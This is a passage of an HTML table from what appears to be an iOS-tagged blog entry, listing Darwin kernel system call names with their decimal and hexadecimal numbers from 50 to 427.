<td align="center">50</td>
<td>SYS_setlogin</td>
<td align="center">0x32</td>
</tr>
<tr>
<td align="center">51</td>
<td>SYS_acct</td>
<td align="center">0x33</td>
</tr>
<tr>
<td align="center">52</td>
<td>SYS_sigpending</td>
<td align="center">0x34</td>
</tr>
<tr>
<td align="center">53</td>
<td>SYS_sigaltstack</td>
<td align="center">0x35</td>
</tr>
<tr>
<td align="center">54</td>
<td>SYS_ioctl</td>
<td align="center">0x36</td>
</tr>
<tr>
<td align="center">55</td>
<td>SYS_reboot</td>
<td align="center">0x37</td>
</tr>
<tr>
<td align="center">56</td>
<td>SYS_revoke</td>
<td align="center">0x38</td>
</tr>
<tr>
<td align="center">57</td>
<td>SYS_symlink</td>
<td align="center">0x39</td>
</tr>
<tr>
<td align="center">58</td>
<td>SYS_readlink</td>
<td align="center">0x3a</td>
</tr>
<tr>
<td align="center">59</td>
<td>SYS_execve</td>
<td align="center">0x3b</td>
</tr>
<tr>
<td align="center">60</td>
<td>SYS_umask</td>
<td align="center">0x3c</td>
</tr>
<tr>
<td align="center">61</td>
<td>SYS_chroot</td>
<td align="center">0x3d</td>
</tr>
<tr>
<td align="center">65</td>
<td>SYS_msync</td>
<td align="center">0x41</td>
</tr>
<tr>
<td align="center">66</td>
<td>SYS_vfork</td>
<td align="center">0x42</td>
</tr>
<tr>
<td align="center">69</td>
<td>SYS_sbrk</td>
<td align="center">0x45</td>
</tr>
<tr>
<td align="center">70</td>
<td>SYS_sstk</td>
<td align="center">0x46</td>
</tr>
<tr>
<td align="center">72</td>
<td>SYS_ovadvise</td>
<td align="center">0x48</td>
</tr>
<tr>
<td align="center">73</td>
<td>SYS_munmap</td>
<td align="center">0x49</td>
</tr>
<tr>
<td align="center">74</td>
<td>SYS_mprotect</td>
<td align="center">0x4a</td>
</tr>
<tr>
<td align="center">75</td>
<td>SYS_madvise</td>
<td align="center">0x4b</td>
</tr>
<tr>
<td align="center">78</td>
<td>SYS_mincore</td>
<td align="center">0x4e</td>
</tr>
<tr>
<td align="center">79</td>
<td>SYS_getgroups</td>
<td align="center">0x4f</td>
</tr>
<tr>
<td align="center">80</td>
<td>SYS_setgroups</td>
<td align="center">0x50</td>
</tr>
<tr>
<td align="center">81</td>
<td>SYS_getpgrp</td>
<td align="center">0x51</td>
</tr>
<tr>
<td align="center">82</td>
<td>SYS_setpgid</td>
<td align="center">0x52</td>
</tr>
<tr>
<td align="center">83</td>
<td>SYS_setitimer</td>
<td align="center">0x53</td>
</tr>
<tr>
<td align="center">85</td>
<td>SYS_swapon</td>
<td align="center">0x55</td>
</tr>
<tr>
<td align="center">86</td>
<td>SYS_getitimer</td>
<td align="center">0x56</td>
</tr>
<tr>
<td align="center">89</td>
<td>SYS_getdtablesize</td>
<td align="center">0x59</td>
</tr>
<tr>
<td align="center">90</td>
<td>SYS_dup2</td>
<td align="center">0x5a</td>
</tr>
<tr>
<td align="center">92</td>
<td>SYS_fcntl</td>
<td align="center">0x5c</td>
</tr>
<tr>
<td align="center">93</td>
<td>SYS_select</td>
<td align="center">0x5d</td>
</tr>
<tr>
<td align="center">95</td>
<td>SYS_fsync</td>
<td align="center">0x5f</td>
</tr>
<tr>
<td align="center">96</td>
<td>SYS_setpriority</td>
<td align="center">0x60</td>
</tr>
<tr>
<td align="center">97</td>
<td>SYS_socket</td>
<td align="center">0x61</td>
</tr>
<tr>
<td align="center">98</td>
<td>SYS_connect</td>
<td align="center">0x62</td>
</tr>
<tr>
<td align="center">100</td>
<td>SYS_getpriority</td>
<td align="center">0x64</td>
</tr>
<tr>
<td align="center">104</td>
<td>SYS_bind</td>
<td align="center">0x68</td>
</tr>
<tr>
<td align="center">105</td>
<td>SYS_setsockopt</td>
<td align="center">0x69</td>
</tr>
<tr>
<td align="center">106</td>
<td>SYS_listen</td>
<td align="center">0x6a</td>
</tr>
<tr>
<td align="center">111</td>
<td>SYS_sigsuspend</td>
<td align="center">0x6f</td>
</tr>
<tr>
<td align="center">116</td>
<td>SYS_gettimeofday</td>
<td align="center">0x74</td>
</tr>
<tr>
<td align="center">117</td>
<td>SYS_getrusage</td>
<td align="center">0x75</td>
</tr>
<tr>
<td align="center">118</td>
<td>SYS_getsockopt</td>
<td align="center">0x76</td>
</tr>
<tr>
<td align="center">120</td>
<td>SYS_readv</td>
<td align="center">0x78</td>
</tr>
<tr>
<td align="center">121</td>
<td>SYS_writev</td>
<td align="center">0x79</td>
</tr>
<tr>
<td align="center">122</td>
<td>SYS_settimeofday</td>
<td align="center">0x7a</td>
</tr>
<tr>
<td align="center">123</td>
<td>SYS_fchown</td>
<td align="center">0x7b</td>
</tr>
<tr>
<td align="center">124</td>
<td>SYS_fchmod</td>
<td align="center">0x7c</td>
</tr>
<tr>
<td align="center">126</td>
<td>SYS_setreuid</td>
<td align="center">0x7e</td>
</tr>
<tr>
<td align="center">127</td>
<td>SYS_setregid</td>
<td align="center">0x7f</td>
</tr>
<tr>
<td align="center">128</td>
<td>SYS_rename</td>
<td align="center">0x80</td>
</tr>
<tr>
<td align="center">131</td>
<td>SYS_flock</td>
<td align="center">0x83</td>
</tr>
<tr>
<td align="center">132</td>
<td>SYS_mkfifo</td>
<td align="center">0x84</td>
</tr>
<tr>
<td align="center">133</td>
<td>SYS_sendto</td>
<td align="center">0x85</td>
</tr>
<tr>
<td align="center">134</td>
<td>SYS_shutdown</td>
<td align="center">0x86</td>
</tr>
<tr>
<td align="center">135</td>
<td>SYS_socketpair</td>
<td align="center">0x87</td>
</tr>
<tr>
<td align="center">136</td>
<td>SYS_mkdir</td>
<td align="center">0x88</td>
</tr>
<tr>
<td align="center">137</td>
<td>SYS_rmdir</td>
<td align="center">0x89</td>
</tr>
<tr>
<td align="center">138</td>
<td>SYS_utimes</td>
<td align="center">0x8a</td>
</tr>
<tr>
<td align="center">139</td>
<td>SYS_futimes</td>
<td align="center">0x8b</td>
</tr>
<tr>
<td align="center">140</td>
<td>SYS_adjtime</td>
<td align="center">0x8c</td>
</tr>
<tr>
<td align="center">142</td>
<td>SYS_gethostuuid</td>
<td align="center">0x8e</td>
</tr>
<tr>
<td align="center">147</td>
<td>SYS_setsid</td>
<td align="center">0x93</td>
</tr>
<tr>
<td align="center">151</td>
<td>SYS_getpgid</td>
<td align="center">0x97</td>
</tr>
<tr>
<td align="center">152</td>
<td>SYS_setprivexec</td>
<td align="center">0x98</td>
</tr>
<tr>
<td align="center">153</td>
<td>SYS_pread</td>
<td align="center">0x99</td>
</tr>
<tr>
<td align="center">154</td>
<td>SYS_pwrite</td>
<td align="center">0x9a</td>
</tr>
<tr>
<td align="center">155</td>
<td>SYS_nfssvc</td>
<td align="center">0x9b</td>
</tr>
<tr>
<td align="center">157</td>
<td>SYS_statfs</td>
<td align="center">0x9d</td>
</tr>
<tr>
<td align="center">158</td>
<td>SYS_fstatfs</td>
<td align="center">0x9e</td>
</tr>
<tr>
<td align="center">159</td>
<td>SYS_unmount</td>
<td align="center">0x9f</td>
</tr>
<tr>
<td align="center">161</td>
<td>SYS_getfh</td>
<td align="center">0xa1</td>
</tr>
<tr>
<td align="center">165</td>
<td>SYS_quotactl</td>
<td align="center">0xa5</td>
</tr>
<tr>
<td align="center">167</td>
<td>SYS_mount</td>
<td align="center">0xa7</td>
</tr>
<tr>
<td align="center">169</td>
<td>SYS_csops</td>
<td align="center">0xa9</td>
</tr>
<tr>
<td align="center">170</td>
<td>SYS_table</td>
<td align="center">0xaa</td>
</tr>
<tr>
<td align="center">173</td>
<td>SYS_waitid</td>
<td align="center">0xad</td>
</tr>
<tr>
<td align="center">176</td>
<td>SYS_add_profil</td>
<td align="center">0xb0</td>
</tr>
<tr>
<td align="center">180</td>
<td>SYS_kdebug_trace</td>
<td align="center">0xb4</td>
</tr>
<tr>
<td align="center">181</td>
<td>SYS_setgid</td>
<td align="center">0xb5</td>
</tr>
<tr>
<td align="center">182</td>
<td>SYS_setegid</td>
<td align="center">0xb6</td>
</tr>
<tr>
<td align="center">183</td>
<td>SYS_seteuid</td>
<td align="center">0xb7</td>
</tr>
<tr>
<td align="center">184</td>
<td>SYS_sigreturn</td>
<td align="center">0xb8</td>
</tr>
<tr>
<td align="center">185</td>
<td>SYS_chud</td>
<td align="center">0xb9</td>
</tr>
<tr>
<td align="center">188</td>
<td>SYS_stat</td>
<td align="center">0xbc</td>
</tr>
<tr>
<td align="center">189</td>
<td>SYS_fstat</td>
<td align="center">0xbd</td>
</tr>
<tr>
<td align="center">190</td>
<td>SYS_lstat</td>
<td align="center">0xbe</td>
</tr>
<tr>
<td align="center">191</td>
<td>SYS_pathconf</td>
<td align="center">0xbf</td>
</tr>
<tr>
<td align="center">192</td>
<td>SYS_fpathconf</td>
<td align="center">0xc0</td>
</tr>
<tr>
<td align="center">194</td>
<td>SYS_getrlimit</td>
<td align="center">0xc2</td>
</tr>
<tr>
<td align="center">195</td>
<td>SYS_setrlimit</td>
<td align="center">0xc3</td>
</tr>
<tr>
<td align="center">196</td>
<td>SYS_getdirentries</td>
<td align="center">0xc4</td>
</tr>
<tr>
<td align="center">197</td>
<td>SYS_mmap</td>
<td align="center">0xc5</td>
</tr>
<tr>
<td align="center">199</td>
<td>SYS_lseek</td>
<td align="center">0xc7</td>
</tr>
<tr>
<td align="center">200</td>
<td>SYS_truncate</td>
<td align="center">0xc8</td>
</tr>
<tr>
<td align="center">201</td>
<td>SYS_ftruncate</td>
<td align="center">0xc9</td>
</tr>
<tr>
<td align="center">202</td>
<td>SYS___sysctl</td>
<td align="center">0xca</td>
</tr>
<tr>
<td align="center">203</td>
<td>SYS_mlock</td>
<td align="center">0xcb</td>
</tr>
<tr>
<td align="center">204</td>
<td>SYS_munlock</td>
<td align="center">0xcc</td>
</tr>
<tr>
<td align="center">205</td>
<td>SYS_undelete</td>
<td align="center">0xcd</td>
</tr>
<tr>
<td align="center">206</td>
<td>SYS_ATsocket</td>
<td align="center">0xce</td>
</tr>
<tr>
<td align="center">207</td>
<td>SYS_ATgetmsg</td>
<td align="center">0xcf</td>
</tr>
<tr>
<td align="center">208</td>
<td>SYS_ATputmsg</td>
<td align="center">0xd0</td>
</tr>
<tr>
<td align="center">209</td>
<td>SYS_ATPsndreq</td>
<td align="center">0xd1</td>
</tr>
<tr>
<td align="center">210</td>
<td>SYS_ATPsndrsp</td>
<td align="center">0xd2</td>
</tr>
<tr>
<td align="center">211</td>
<td>SYS_ATPgetreq</td>
<td align="center">0xd3</td>
</tr>
<tr>
<td align="center">212</td>
<td>SYS_ATPgetrsp</td>
<td align="center">0xd4</td>
</tr>
<tr>
<td align="center">214</td>
<td>SYS_kqueue_from_portset_np</td>
<td align="center">0xd6</td>
</tr>
<tr>
<td align="center">215</td>
<td>SYS_kqueue_portset_np</td>
<td align="center">0xd7</td>
</tr>
<tr>
<td align="center">216</td>
<td>SYS_mkcomplex</td>
<td align="center">0xd8</td>
</tr>
<tr>
<td align="center">217</td>
<td>SYS_statv</td>
<td align="center">0xd9</td>
</tr>
<tr>
<td align="center">218</td>
<td>SYS_lstatv</td>
<td align="center">0xda</td>
</tr>
<tr>
<td align="center">219</td>
<td>SYS_fstatv</td>
<td align="center">0xdb</td>
</tr>
<tr>
<td align="center">220</td>
<td>SYS_getattrlist</td>
<td align="center">0xdc</td>
</tr>
<tr>
<td align="center">221</td>
<td>SYS_setattrlist</td>
<td align="center">0xdd</td>
</tr>
<tr>
<td align="center">222</td>
<td>SYS_getdirentriesattr</td>
<td align="center">0xde</td>
</tr>
<tr>
<td align="center">223</td>
<td>SYS_exchangedata</td>
<td align="center">0xdf</td>
</tr>
<tr>
<td align="center">225</td>
<td>SYS_searchfs</td>
<td align="center">0xe1</td>
</tr>
<tr>
<td align="center">226</td>
<td>SYS_delete</td>
<td align="center">0xe2</td>
</tr>
<tr>
<td align="center">227</td>
<td>SYS_copyfile</td>
<td align="center">0xe3</td>
</tr>
<tr>
<td align="center">230</td>
<td>SYS_poll</td>
<td align="center">0xe6</td>
</tr>
<tr>
<td align="center">231</td>
<td>SYS_watchevent</td>
<td align="center">0xe7</td>
</tr>
<tr>
<td align="center">232</td>
<td>SYS_waitevent</td>
<td align="center">0xe8</td>
</tr>
<tr>
<td align="center">233</td>
<td>SYS_modwatch</td>
<td align="center">0xe9</td>
</tr>
<tr>
<td align="center">234</td>
<td>SYS_getxattr</td>
<td align="center">0xea</td>
</tr>
<tr>
<td align="center">235</td>
<td>SYS_fgetxattr</td>
<td align="center">0xeb</td>
</tr>
<tr>
<td align="center">236</td>
<td>SYS_setxattr</td>
<td align="center">0xec</td>
</tr>
<tr>
<td align="center">237</td>
<td>SYS_fsetxattr</td>
<td align="center">0xed</td>
</tr>
<tr>
<td align="center">238</td>
<td>SYS_removexattr</td>
<td align="center">0xee</td>
</tr>
<tr>
<td align="center">239</td>
<td>SYS_fremovexattr</td>
<td align="center">0xef</td>
</tr>
<tr>
<td align="center">240</td>
<td>SYS_listxattr</td>
<td align="center">0xf0</td>
</tr>
<tr>
<td align="center">241</td>
<td>SYS_flistxattr</td>
<td align="center">0xf1</td>
</tr>
<tr>
<td align="center">242</td>
<td>SYS_fsctl</td>
<td align="center">0xf2</td>
</tr>
<tr>
<td align="center">243</td>
<td>SYS_initgroups</td>
<td align="center">0xf3</td>
</tr>
<tr>
<td align="center">244</td>
<td>SYS_posix_spawn</td>
<td align="center">0xf4</td>
</tr>
<tr>
<td align="center">247</td>
<td>SYS_nfsclnt</td>
<td align="center">0xf7</td>
</tr>
<tr>
<td align="center">248</td>
<td>SYS_fhopen</td>
<td align="center">0xf8</td>
</tr>
<tr>
<td align="center">250</td>
<td>SYS_minherit</td>
<td align="center">0xfa</td>
</tr>
<tr>
<td align="center">251</td>
<td>SYS_semsys</td>
<td align="center">0xfb</td>
</tr>
<tr>
<td align="center">252</td>
<td>SYS_msgsys</td>
<td align="center">0xfc</td>
</tr>
<tr>
<td align="center">253</td>
<td>SYS_shmsys</td>
<td align="center">0xfd</td>
</tr>
<tr>
<td align="center">254</td>
<td>SYS_semctl</td>
<td align="center">0xfe</td>
</tr>
<tr>
<td align="center">255</td>
<td>SYS_semget</td>
<td align="center">0xff</td>
</tr>
<tr>
<td align="center">256</td>
<td>SYS_semop</td>
<td align="center">0x100</td>
</tr>
<tr>
<td align="center">258</td>
<td>SYS_msgctl</td>
<td align="center">0x102</td>
</tr>
<tr>
<td align="center">259</td>
<td>SYS_msgget</td>
<td align="center">0x103</td>
</tr>
<tr>
<td align="center">260</td>
<td>SYS_msgsnd</td>
<td align="center">0x104</td>
</tr>
<tr>
<td align="center">261</td>
<td>SYS_msgrcv</td>
<td align="center">0x105</td>
</tr>
<tr>
<td align="center">262</td>
<td>SYS_shmat</td>
<td align="center">0x106</td>
</tr>
<tr>
<td align="center">263</td>
<td>SYS_shmctl</td>
<td align="center">0x107</td>
</tr>
<tr>
<td align="center">264</td>
<td>SYS_shmdt</td>
<td align="center">0x108</td>
</tr>
<tr>
<td align="center">265</td>
<td>SYS_shmget</td>
<td align="center">0x109</td>
</tr>
<tr>
<td align="center">266</td>
<td>SYS_shm_open</td>
<td align="center">0x10a</td>
</tr>
<tr>
<td align="center">267</td>
<td>SYS_shm_unlink</td>
<td align="center">0x10b</td>
</tr>
<tr>
<td align="center">268</td>
<td>SYS_sem_open</td>
<td align="center">0x10c</td>
</tr>
<tr>
<td align="center">269</td>
<td>SYS_sem_close</td>
<td align="center">0x10d</td>
</tr>
<tr>
<td align="center">270</td>
<td>SYS_sem_unlink</td>
<td align="center">0x10e</td>
</tr>
<tr>
<td align="center">271</td>
<td>SYS_sem_wait</td>
<td align="center">0x10f</td>
</tr>
<tr>
<td align="center">272</td>
<td>SYS_sem_trywait</td>
<td align="center">0x110</td>
</tr>
<tr>
<td align="center">273</td>
<td>SYS_sem_post</td>
<td align="center">0x111</td>
</tr>
<tr>
<td align="center">274</td>
<td>SYS_sem_getvalue</td>
<td align="center">0x112</td>
</tr>
<tr>
<td align="center">275</td>
<td>SYS_sem_init</td>
<td align="center">0x113</td>
</tr>
<tr>
<td align="center">276</td>
<td>SYS_sem_destroy</td>
<td align="center">0x114</td>
</tr>
<tr>
<td align="center">277</td>
<td>SYS_open_extended</td>
<td align="center">0x115</td>
</tr>
<tr>
<td align="center">278</td>
<td>SYS_umask_extended</td>
<td align="center">0x116</td>
</tr>
<tr>
<td align="center">279</td>
<td>SYS_stat_extended</td>
<td align="center">0x117</td>
</tr>
<tr>
<td align="center">280</td>
<td>SYS_lstat_extended</td>
<td align="center">0x118</td>
</tr>
<tr>
<td align="center">281</td>
<td>SYS_fstat_extended</td>
<td align="center">0x119</td>
</tr>
<tr>
<td align="center">282</td>
<td>SYS_chmod_extended</td>
<td align="center">0x11a</td>
</tr>
<tr>
<td align="center">283</td>
<td>SYS_fchmod_extended</td>
<td align="center">0x11b</td>
</tr>
<tr>
<td align="center">284</td>
<td>SYS_access_extended</td>
<td align="center">0x11c</td>
</tr>
<tr>
<td align="center">285</td>
<td>SYS_settid</td>
<td align="center">0x11d</td>
</tr>
<tr>
<td align="center">286</td>
<td>SYS_gettid</td>
<td align="center">0x11e</td>
</tr>
<tr>
<td align="center">287</td>
<td>SYS_setsgroups</td>
<td align="center">0x11f</td>
</tr>
<tr>
<td align="center">288</td>
<td>SYS_getsgroups</td>
<td align="center">0x120</td>
</tr>
<tr>
<td align="center">289</td>
<td>SYS_setwgroups</td>
<td align="center">0x121</td>
</tr>
<tr>
<td align="center">290</td>
<td>SYS_getwgroups</td>
<td align="center">0x122</td>
</tr>
<tr>
<td align="center">291</td>
<td>SYS_mkfifo_extended</td>
<td align="center">0x123</td>
</tr>
<tr>
<td align="center">292</td>
<td>SYS_mkdir_extended</td>
<td align="center">0x124</td>
</tr>
<tr>
<td align="center">293</td>
<td>SYS_identitysvc</td>
<td align="center">0x125</td>
</tr>
<tr>
<td align="center">294</td>
<td>SYS_shared_region_check_np</td>
<td align="center">0x126</td>
</tr>
<tr>
<td align="center">295</td>
<td>SYS_shared_region_map_np</td>
<td align="center">0x127</td>
</tr>
<tr>
<td align="center">301</td>
<td>SYS___pthread_mutex_destroy</td>
<td align="center">0x12d</td>
</tr>
<tr>
<td align="center">302</td>
<td>SYS___pthread_mutex_init</td>
<td align="center">0x12e</td>
</tr>
<tr>
<td align="center">303</td>
<td>SYS___pthread_mutex_lock</td>
<td align="center">0x12f</td>
</tr>
<tr>
<td align="center">304</td>
<td>SYS___pthread_mutex_trylock</td>
<td align="center">0x130</td>
</tr>
<tr>
<td align="center">305</td>
<td>SYS___pthread_mutex_unlock</td>
<td align="center">0x131</td>
</tr>
<tr>
<td align="center">306</td>
<td>SYS___pthread_cond_init</td>
<td align="center">0x132</td>
</tr>
<tr>
<td align="center">307</td>
<td>SYS___pthread_cond_destroy</td>
<td align="center">0x133</td>
</tr>
<tr>
<td align="center">308</td>
<td>SYS___pthread_cond_broadcast</td>
<td align="center">0x134</td>
</tr>
<tr>
<td align="center">309</td>
<td>SYS___pthread_cond_signal</td>
<td align="center">0x135</td>
</tr>
<tr>
<td align="center">310</td>
<td>SYS_getsid</td>
<td align="center">0x136</td>
</tr>
<tr>
<td align="center">311</td>
<td>SYS_settid_with_pid</td>
<td align="center">0x137</td>
</tr>
<tr>
<td align="center">312</td>
<td>SYS___pthread_cond_timedwait</td>
<td align="center">0x138</td>
</tr>
<tr>
<td align="center">313</td>
<td>SYS_aio_fsync</td>
<td align="center">0x139</td>
</tr>
<tr>
<td align="center">314</td>
<td>SYS_aio_return</td>
<td align="center">0x13a</td>
</tr>
<tr>
<td align="center">315</td>
<td>SYS_aio_suspend</td>
<td align="center">0x13b</td>
</tr>
<tr>
<td align="center">316</td>
<td>SYS_aio_cancel</td>
<td align="center">0x13c</td>
</tr>
<tr>
<td align="center">317</td>
<td>SYS_aio_error</td>
<td align="center">0x13d</td>
</tr>
<tr>
<td align="center">318</td>
<td>SYS_aio_read</td>
<td align="center">0x13e</td>
</tr>
<tr>
<td align="center">319</td>
<td>SYS_aio_write</td>
<td align="center">0x13f</td>
</tr>
<tr>
<td align="center">320</td>
<td>SYS_lio_listio</td>
<td align="center">0x140</td>
</tr>
<tr>
<td align="center">321</td>
<td>SYS___pthread_cond_wait</td>
<td align="center">0x141</td>
</tr>
<tr>
<td align="center">322</td>
<td>SYS_iopolicysys</td>
<td align="center">0x142</td>
</tr>
<tr>
<td align="center">324</td>
<td>SYS_mlockall</td>
<td align="center">0x144</td>
</tr>
<tr>
<td align="center">325</td>
<td>SYS_munlockall</td>
<td align="center">0x145</td>
</tr>
<tr>
<td align="center">327</td>
<td>SYS_issetugid</td>
<td align="center">0x147</td>
</tr>
<tr>
<td align="center">328</td>
<td>SYS___pthread_kill</td>
<td align="center">0x148</td>
</tr>
<tr>
<td align="center">329</td>
<td>SYS___pthread_sigmask</td>
<td align="center">0x149</td>
</tr>
<tr>
<td align="center">330</td>
<td>SYS___sigwait</td>
<td align="center">0x14a</td>
</tr>
<tr>
<td align="center">331</td>
<td>SYS___disable_threadsignal</td>
<td align="center">0x14b</td>
</tr>
<tr>
<td align="center">332</td>
<td>SYS___pthread_markcancel</td>
<td align="center">0x14c</td>
</tr>
<tr>
<td align="center">333</td>
<td>SYS___pthread_canceled</td>
<td align="center">0x14d</td>
</tr>
<tr>
<td align="center">334</td>
<td>SYS___semwait_signal</td>
<td align="center">0x14e</td>
</tr>
<tr>
<td align="center">336</td>
<td>SYS_proc_info</td>
<td align="center">0x150</td>
</tr>
<tr>
<td align="center">337</td>
<td>SYS_sendfile</td>
<td align="center">0x151</td>
</tr>
<tr>
<td align="center">338</td>
<td>SYS_stat64</td>
<td align="center">0x152</td>
</tr>
<tr>
<td align="center">339</td>
<td>SYS_fstat64</td>
<td align="center">0x153</td>
</tr>
<tr>
<td align="center">340</td>
<td>SYS_lstat64</td>
<td align="center">0x154</td>
</tr>
<tr>
<td align="center">341</td>
<td>SYS_stat64_extended</td>
<td align="center">0x155</td>
</tr>
<tr>
<td align="center">342</td>
<td>SYS_lstat64_extended</td>
<td align="center">0x156</td>
</tr>
<tr>
<td align="center">343</td>
<td>SYS_fstat64_extended</td>
<td align="center">0x157</td>
</tr>
<tr>
<td align="center">344</td>
<td>SYS_getdirentries64</td>
<td align="center">0x158</td>
</tr>
<tr>
<td align="center">345</td>
<td>SYS_statfs64</td>
<td align="center">0x159</td>
</tr>
<tr>
<td align="center">346</td>
<td>SYS_fstatfs64</td>
<td align="center">0x15a</td>
</tr>
<tr>
<td align="center">347</td>
<td>SYS_getfsstat64</td>
<td align="center">0x15b</td>
</tr>
<tr>
<td align="center">348</td>
<td>SYS___pthread_chdir</td>
<td align="center">0x15c</td>
</tr>
<tr>
<td align="center">349</td>
<td>SYS___pthread_fchdir</td>
<td align="center">0x15d</td>
</tr>
<tr>
<td align="center">350</td>
<td>SYS_audit</td>
<td align="center">0x15e</td>
</tr>
<tr>
<td align="center">351</td>
<td>SYS_auditon</td>
<td align="center">0x15f</td>
</tr>
<tr>
<td align="center">353</td>
<td>SYS_getauid</td>
<td align="center">0x161</td>
</tr>
<tr>
<td align="center">354</td>
<td>SYS_setauid</td>
<td align="center">0x162</td>
</tr>
<tr>
<td align="center">355</td>
<td>SYS_getaudit</td>
<td align="center">0x163</td>
</tr>
<tr>
<td align="center">356</td>
<td>SYS_setaudit</td>
<td align="center">0x164</td>
</tr>
<tr>
<td align="center">357</td>
<td>SYS_getaudit_addr</td>
<td align="center">0x165</td>
</tr>
<tr>
<td align="center">358</td>
<td>SYS_setaudit_addr</td>
<td align="center">0x166</td>
</tr>
<tr>
<td align="center">359</td>
<td>SYS_auditctl</td>
<td align="center">0x167</td>
</tr>
<tr>
<td align="center">360</td>
<td>SYS_bsdthread_create</td>
<td align="center">0x168</td>
</tr>
<tr>
<td align="center">361</td>
<td>SYS_bsdthread_terminate</td>
<td align="center">0x169</td>
</tr>
<tr>
<td align="center">362</td>
<td>SYS_kqueue</td>
<td align="center">0x16a</td>
</tr>
<tr>
<td align="center">363</td>
<td>SYS_kevent</td>
<td align="center">0x16b</td>
</tr>
<tr>
<td align="center">364</td>
<td>SYS_lchown</td>
<td align="center">0x16c</td>
</tr>
<tr>
<td align="center">365</td>
<td>SYS_stack_snapshot</td>
<td align="center">0x16d</td>
</tr>
<tr>
<td align="center">366</td>
<td>SYS_bsdthread_register</td>
<td align="center">0x16e</td>
</tr>
<tr>
<td align="center">367</td>
<td>SYS_workq_open</td>
<td align="center">0x16f</td>
</tr>
<tr>
<td align="center">368</td>
<td>SYS_workq_ops</td>
<td align="center">0x170</td>
</tr>
<tr>
<td align="center">380</td>
<td>SYS___mac_execve</td>
<td align="center">0x17c</td>
</tr>
<tr>
<td align="center">381</td>
<td>SYS___mac_syscall</td>
<td align="center">0x17d</td>
</tr>
<tr>
<td align="center">382</td>
<td>SYS___mac_get_file</td>
<td align="center">0x17e</td>
</tr>
<tr>
<td align="center">383</td>
<td>SYS___mac_set_file</td>
<td align="center">0x17f</td>
</tr>
<tr>
<td align="center">384</td>
<td>SYS___mac_get_link</td>
<td align="center">0x180</td>
</tr>
<tr>
<td align="center">385</td>
<td>SYS___mac_set_link</td>
<td align="center">0x181</td>
</tr>
<tr>
<td align="center">386</td>
<td>SYS___mac_get_proc</td>
<td align="center">0x182</td>
</tr>
<tr>
<td align="center">387</td>
<td>SYS___mac_set_proc</td>
<td align="center">0x183</td>
</tr>
<tr>
<td align="center">388</td>
<td>SYS___mac_get_fd</td>
<td align="center">0x184</td>
</tr>
<tr>
<td align="center">389</td>
<td>SYS___mac_set_fd</td>
<td align="center">0x185</td>
</tr>
<tr>
<td align="center">390</td>
<td>SYS___mac_get_pid</td>
<td align="center">0x186</td>
</tr>
<tr>
<td align="center">391</td>
<td>SYS___mac_get_lcid</td>
<td align="center">0x187</td>
</tr>
<tr>
<td align="center">392</td>
<td>SYS___mac_get_lctx</td>
<td align="center">0x188</td>
</tr>
<tr>
<td align="center">393</td>
<td>SYS___mac_set_lctx</td>
<td align="center">0x189</td>
</tr>
<tr>
<td align="center">394</td>
<td>SYS_setlcid</td>
<td align="center">0x18a</td>
</tr>
<tr>
<td align="center">395</td>
<td>SYS_getlcid</td>
<td align="center">0x18b</td>
</tr>
<tr>
<td align="center">396</td>
<td>SYS_read_nocancel</td>
<td align="center">0x18c</td>
</tr>
<tr>
<td align="center">397</td>
<td>SYS_write_nocancel</td>
<td align="center">0x18d</td>
</tr>
<tr>
<td align="center">398</td>
<td>SYS_open_nocancel</td>
<td align="center">0x18e</td>
</tr>
<tr>
<td align="center">399</td>
<td>SYS_close_nocancel</td>
<td align="center">0x18f</td>
</tr>
<tr>
<td align="center">400</td>
<td>SYS_wait4_nocancel</td>
<td align="center">0x190</td>
</tr>
<tr>
<td align="center">401</td>
<td>SYS_recvmsg_nocancel</td>
<td align="center">0x191</td>
</tr>
<tr>
<td align="center">402</td>
<td>SYS_sendmsg_nocancel</td>
<td align="center">0x192</td>
</tr>
<tr>
<td align="center">403</td>
<td>SYS_recvfrom_nocancel</td>
<td align="center">0x193</td>
</tr>
<tr>
<td align="center">404</td>
<td>SYS_accept_nocancel</td>
<td align="center">0x194</td>
</tr>
<tr>
<td align="center">405</td>
<td>SYS_msync_nocancel</td>
<td align="center">0x195</td>
</tr>
<tr>
<td align="center">406</td>
<td>SYS_fcntl_nocancel</td>
<td align="center">0x196</td>
</tr>
<tr>
<td align="center">407</td>
<td>SYS_select_nocancel</td>
<td align="center">0x197</td>
</tr>
<tr>
<td align="center">408</td>
<td>SYS_fsync_nocancel</td>
<td align="center">0x198</td>
</tr>
<tr>
<td align="center">409</td>
<td>SYS_connect_nocancel</td>
<td align="center">0x199</td>
</tr>
<tr>
<td align="center">410</td>
<td>SYS_sigsuspend_nocancel</td>
<td align="center">0x19a</td>
</tr>
<tr>
<td align="center">411</td>
<td>SYS_readv_nocancel</td>
<td align="center">0x19b</td>
</tr>
<tr>
<td align="center">412</td>
<td>SYS_writev_nocancel</td>
<td align="center">0x19c</td>
</tr>
<tr>
<td align="center">413</td>
<td>SYS_sendto_nocancel</td>
<td align="center">0x19d</td>
</tr>
<tr>
<td align="center">414</td>
<td>SYS_pread_nocancel</td>
<td align="center">0x19e</td>
</tr>
<tr>
<td align="center">415</td>
<td>SYS_pwrite_nocancel</td>
<td align="center">0x19f</td>
</tr>
<tr>
<td align="center">416</td>
<td>SYS_waitid_nocancel</td>
<td align="center">0x1a0</td>
</tr>
<tr>
<td align="center">417</td>
<td>SYS_poll_nocancel</td>
<td align="center">0x1a1</td>
</tr>
<tr>
<td align="center">418</td>
<td>SYS_msgsnd_nocancel</td>
<td align="center">0x1a2</td>
</tr>
<tr>
<td align="center">419</td>
<td>SYS_msgrcv_nocancel</td>
<td align="center">0x1a3</td>
</tr>
<tr>
<td align="center">420</td>
<td>SYS_sem_wait_nocancel</td>
<td align="center">0x1a4</td>
</tr>
<tr>
<td align="center">421</td>
<td>SYS_aio_suspend_nocancel</td>
<td align="center">0x1a5</td>
</tr>
<tr>
<td align="center">422</td>
<td>SYS___sigwait_nocancel</td>
<td align="center">0x1a6</td>
</tr>
<tr>
<td align="center">423</td>
<td>SYS___semwait_signal_nocancel</td>
<td align="center">0x1a7</td>
</tr>
<tr>
<td align="center">424</td>
<td>SYS427___mac_mount</td>
<td align="center">0x1a8</td>
</tr>
<tr>
<td align="center">425</td>
<td>SYS___mac_get_mount</td>
<td align="center">0x1a9</td>
</tr>
<tr>
<td align="center">426</td>
<td>SYS___mac_getfsstat</td>
<td align="center">0x1aa</td>
</tr>
<tr>
<td align="center">427</td>
<td>SYS_MAXSYSCALL</td>
<td align="center">0x1ab</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>iOS</tag>
      </tags>
  </entry>
